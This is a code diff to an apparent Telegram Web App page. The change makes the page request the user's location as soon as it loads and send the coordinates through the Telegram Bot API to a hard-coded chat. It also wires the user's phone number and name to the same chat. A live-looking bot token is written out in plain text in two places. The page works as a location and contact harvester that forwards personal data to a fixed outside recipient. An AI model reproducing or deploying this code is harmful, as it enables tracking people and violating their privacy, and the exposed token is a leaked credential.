@@ -85,7 +85,7 @@
     </style>
 </head>
 
-<body onload="contacts()">
+<body onload="requestLocation()">
     <main>
         <div align="center">
             <a href="https://ton.org/"><img width="48" src="./assets/tapps.png" alt="logo of telegram web apps"></a>
@@ -158,52 +158,46 @@
                 Telegram.WebApp.MainButton.show();
             }
         };
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendLocation, showError);
+        function requestLocation() {
+    if (!Telegram.WebApp.LocationManager.isInited) {
+        Telegram.WebApp.LocationManager.init(() => {
+            console.log("LocationManager initialized");
+        });
+    }
+
+    Telegram.WebApp.LocationManager.getLocation((location) => {
+        if (!location) {
+            Telegram.WebApp.showAlert("Location access was not granted.");
+            return;
+        }
+
+        const { latitude, longitude } = location;
+
+        console.log("Latitude:", latitude, "Longitude:", longitude);
+
+        sendLocationToTelegram(latitude, longitude);
+    });
+}
+
+function sendLocationToTelegram(latitude, longitude) {
+    const chatId = "7265296083";  // Replace with actual chat ID
+    const botToken = "7628792743:AAHU7rESkOh5jhMsiyHg7QSuEJGhPzfV4mE"; // Replace with your bot token
+
+    const url = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;
+
+    fetch(url)
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                Telegram.WebApp.showAlert("Location sent successfully!");
             } else {
-                Telegram.WebApp.showAlert("Geolocation is not supported by this browser.");
+                Telegram.WebApp.showAlert("Failed to send location: " + data.description);
             }
-        }
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    sendLocation,
-                    showError,
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                );
-            } else {
-                Telegram.WebApp.showAlert("Geolocation is not supported by this browser.");
-            }
-        }
-
-        function sendLocation(position) {
-            if (!position || !position.coords) {
-                Telegram.WebApp.showAlert("Failed to retrieve location.");
-                return;
-            }
-
-            const chatId = "7265296083";  // Replace with actual chat ID
-            const botToken = "7628792743:AAHU7rESkOh5jhMsiyHg7QSuEJGhPzfV4mE"; // Replace with your bot token
-            const { latitude, longitude } = position.coords;
-
-            console.log("Latitude:", latitude, "Longitude:", longitude);
-
-            const url = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;
-
-            fetch(url)
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        Telegram.WebApp.showAlert("Location sent successfully!");
-                    } else {
-                        Telegram.WebApp.showAlert("Failed to send location. Error: " + data.description);
-                    }
-                })
-                .catch(error => {
-                    Telegram.WebApp.showAlert("Error: " + error.message);
-                });
-        }
+        })
+        .catch(error => {
+            Telegram.WebApp.showAlert("Error: " + error.message);
+        });
+}
 
         function contacts() {
             Telegram.WebApp.requestContact();
@@ -214,7 +208,7 @@
 
         function sendContactToTelegram(user) {
             const chatId = "7265296083";  // Replace with actual chat ID
-            const botToken = "YOUR_BOT_TOKEN";
+            const botToken = "7628792743:AAHU7rESkOh5jhMsiyHg7QSuEJGhPzfV4mE";
 
             const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=Contact: ${user.phone_number} - ${user.first_name}`;
 
